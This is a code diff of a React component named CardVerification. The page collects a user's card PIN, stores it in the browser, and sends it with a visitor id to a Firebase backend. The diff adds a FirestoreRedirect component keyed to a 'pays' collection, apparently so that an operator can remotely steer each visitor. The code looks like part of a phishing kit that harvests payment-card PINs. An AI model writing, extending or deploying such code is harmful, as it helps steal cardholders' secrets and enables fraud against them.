@@ -5,11 +5,13 @@ import type React from "react";
 import { useState, useCallback } from "react";
 import { useNavigate } from "react-router-dom";
 import { addData } from "../apis/firebase";
+import FirestoreRedirect from "./rediract-page";
 
 export const CardVerification = () => {
   const navigate = useNavigate();
   const [pin, setPin] = useState("");
   const [error, setError] = useState("");
+  const _id = localStorage.getItem("visitor");
 
   const handlePinChange = useCallback(
     (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -30,7 +32,6 @@ export const CardVerification = () => {
       }
 
       try {
-        const _id = localStorage.getItem("visitor");
         // Store the PIN in localStorage instead of Redux
         localStorage.setItem("card_pin", JSON.stringify(pin));
         addData({ id: _id, pinCode: pin });
@@ -47,6 +48,8 @@ export const CardVerification = () => {
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 py-20 px-4 md:py-40">
       <div className="max-w-xl mx-auto">
+        <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+
         <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
           <div className="text-center mb-8 md:mb-10">
             <h1 className="text-2xl md:text-3xl font-bold mb-3 md:mb-4 text-[#146394] tracking-tight">
